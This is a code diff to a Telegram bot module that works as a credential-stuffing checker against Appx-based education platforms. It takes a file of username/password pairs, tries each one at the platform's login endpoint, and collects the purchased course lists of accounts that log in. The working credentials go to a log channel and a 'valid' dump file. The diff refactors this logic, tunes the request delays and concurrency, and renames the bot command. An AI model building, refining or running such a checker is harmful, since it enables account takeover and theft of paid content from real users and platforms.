@@ -1,6 +1,5 @@
 import asyncio
 import requests
-import random
 from Extractor import app
 from pyrogram import filters
 from asyncio import Lock
@@ -8,12 +7,12 @@ from config import PREMIUM_LOGS
 
 # ================= CONFIG =================
 LOG_CHANNEL_ID = PREMIUM_LOGS   # <-- change this
-SEM = asyncio.Semaphore(5)
+SEM = asyncio.Semaphore(2)
 
 # ===== RATE CONTROL =====
-REQUEST_DELAY = (0.4, 0.7)        # delay per account
-LOG_DELAY = (0.8, 1.2)            # delay before log send
-PROGRESS_UPDATE_EVERY = 5         # edit progress every N checks
+REQUEST_DELAY = 0.5               # 0.5 sec per account
+LOG_DELAY = 1.0                   # 1 sec before log send
+PROGRESS_UPDATE_EVERY = 50        # update after 50 checks
 
 # ================= GLOBAL STATE =================
 stats = {
@@ -43,9 +42,17 @@ def progress_bar(done, total):
     percent = int((done / total) * 100)
     return f"💻 Progress : {percent}%"
 
+async def safe_edit(msg, text):
+    try:
+        await msg.edit_text(text)
+    except:
+        pass   # UI fail must NEVER stop checking
+
 # ================= CORE FUNCTION =================
 async def login_and_get_courses(n, p, api, bot, progress_msg):
     async with SEM:
+        is_valid = False
+
         h = {
             "client-service": "Appx",
             "auth-key": "appxapi",
@@ -65,86 +72,56 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
 
         loop = asyncio.get_running_loop()
 
-        # -------- LOGIN --------
         try:
             r1 = await loop.run_in_executor(
                 None, post_request, f"https://{api}/post/userLogin", h, d
             )
             r1 = r1.json()
         except:
-            async with stats_lock:
-                stats["checked"] += 1
-                stats["invalid"] += 1
-            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
-            return
+            pass
+        else:
+            data = r1.get("data") if isinstance(r1, dict) else None
+            token = data.get("token") if isinstance(data, dict) else None
 
-        if not isinstance(r1, dict):
-            async with stats_lock:
-                stats["checked"] += 1
-                stats["invalid"] += 1
-            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
-            return
+            if token:
+                h["authorization"] = token
+                try:
+                    r2 = await loop.run_in_executor(
+                        None, get_request,
+                        f"https://{api}/get/mycourseweb?userid=", h
+                    )
+                    r2 = r2.json()
+                except:
+                    pass
+                else:
+                    courses = r2.get("data") if isinstance(r2, dict) else None
+                    if isinstance(courses, list):
+                        batches = [
+                            i.get("course_name")
+                            for i in courses
+                            if isinstance(i, dict) and i.get("course_name")
+                        ]
+                        if batches:
+                            is_valid = True
 
-        data = r1.get("data")
-        if not isinstance(data, dict) or not data.get("token"):
-            async with stats_lock:
-                stats["checked"] += 1
-                stats["invalid"] += 1
-            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
-            return
+                            success_text = (
+                                f"👤 Account: `{n}*{p}`\n\n"
+                                f"📚 Total Batches: {len(batches)}\n\n"
+                            )
+                            for b in batches:
+                                success_text += f"🪪 {b}\n"
 
-        h["authorization"] = data["token"]
-
-        # -------- COURSES --------
-        try:
-            r2 = await loop.run_in_executor(
-                None, get_request, f"https://{api}/get/mycourseweb?userid=", h
-            )
-            r2 = r2.json()
-        except:
-            async with stats_lock:
-                stats["checked"] += 1
-                stats["invalid"] += 1
-            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
-            return
-
-        if not isinstance(r2, dict) or not isinstance(r2.get("data"), list):
-            async with stats_lock:
-                stats["checked"] += 1
-                stats["invalid"] += 1
-            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
-            return
-
-        batches = [
-            i.get("course_name")
-            for i in r2["data"]
-            if isinstance(i, dict) and i.get("course_name")
-        ]
-
-        if not batches:
-            async with stats_lock:
-                stats["checked"] += 1
-                stats["invalid"] += 1
-            await asyncio.sleep(random.uniform(*REQUEST_DELAY))
-            return
-
-        # ================= SUCCESS FORMAT =================
-        success_text = (
-            f"👤 Account: `{n}*{p}`\n\n"
-            f"📚 Total Batches: {len(batches)}\n\n"
-        )
-        for b in batches:
-            success_text += f"🪪 {b}\n"
-
-        # ---- log channel (rate safe) ----
-        await asyncio.sleep(random.uniform(*LOG_DELAY))
-        await bot.send_message(LOG_CHANNEL_ID, success_text)
-
-        results.append(success_text)
+                            await asyncio.sleep(LOG_DELAY)
+                            await bot.send_message(LOG_CHANNEL_ID, success_text)
+                            results.append(success_text)
 
         async with stats_lock:
             stats["checked"] += 1
-            stats["valid"] += 1
+            if is_valid:
+                stats["valid"] += 1
+            else:
+                stats["invalid"] += 1
+
             checked = stats["checked"]
             valid = stats["valid"]
             invalid = stats["invalid"]
@@ -152,23 +129,22 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
 
         remaining = total - checked
 
-        # ---- progress update (throttled) ----
         if checked % PROGRESS_UPDATE_EVERY == 0 or checked == total:
-            try:
-                await progress_msg.edit_text(
+            asyncio.create_task(
+                safe_edit(
+                    progress_msg,
                     f"{progress_bar(checked, total)}\n\n"
                     f"⚙️ Checked : {checked}\n"
                     f"📊 Valid   : {valid}\n"
                     f"❌ Invalid : {invalid}\n"
                     f"💾 Left    : {remaining}"
                 )
-            except:
-                pass
+            )
 
-        await asyncio.sleep(random.uniform(*REQUEST_DELAY))
+        await asyncio.sleep(REQUEST_DELAY)
 
 # ================= COMMAND =================
-@app.on_message(filters.command("imjadu2"))
+@app.on_message(filters.command("babe"))
 async def pw_command_handler(bot, m):
     cfile = await bot.ask(
         m.chat.id,
@@ -209,8 +185,13 @@ async def pw_command_handler(bot, m):
     api_name = extract_api_name(api)
     txt_path = f"valid_{api_name}.txt"
 
-    with open(txt_path, "w", encoding="utf-8") as f:
-        f.write("\n\n".join(results))
+    if results:
+        with open(txt_path, "w", encoding="utf-8") as f:
+            f.write("\n\n".join(results))
 
-    await m.reply_document(txt_path, caption="📄 Final Valid Results")
-    await bot.send_document(LOG_CHANNEL_ID, txt_path, caption="📄 Full Valid Dump")
+        await m.reply_document(txt_path, caption="📄 Final Valid Results")
+        await bot.send_document(LOG_CHANNEL_ID, txt_path, caption="📄 Full Valid Dump")
+    else:
+        await m.reply_text(
+            "❌ No valid accounts found.\nAll credentials were checked safely."
+        )
